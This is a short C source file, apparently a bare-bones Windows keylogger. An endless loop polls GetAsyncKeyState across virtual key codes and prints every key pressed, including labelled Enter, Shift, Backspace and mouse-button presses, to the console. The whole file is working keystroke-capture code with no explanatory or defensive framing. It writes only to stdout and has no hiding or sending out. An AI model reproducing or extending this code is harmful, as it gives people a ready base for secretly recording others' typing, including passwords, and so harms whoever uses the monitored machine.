#include <windows.h>
#include <stdio.h>

#define ever ;;

int process_key(int key)
{
    switch (key)
    {
        case VK_SPACE:
        {
            printf(" ");
            break;
        }
        case VK_RETURN:
        {
            printf("[ENTER]\n");
            break;
        }
        case VK_SHIFT:
        {
            printf("[SHIFT]");
            break;
        }
        case VK_BACK:
        {
            printf("[BACKSPACE]");
            break;
        }
        case VK_RBUTTON:
        {
            printf("[RBUTTON]");
            break;
        }
        case VK_LBUTTON:
        {
            printf("[LBUTTON]");
            break;
        }
        default:
        {
            return 0;
        }
    }

    return 1;
}

int main(void)
{
    short key;
    int   rv;

    for (ever)
    {
        Sleep(10);
        for (key = 8; key <= 190; key++)
        {
            if ((rv = GetAsyncKeyState(key) == -32767 ? process_key(key) == 0: 0))
            {
                printf("%c", (char)key);
            }
        }
    }

    return 0;
}
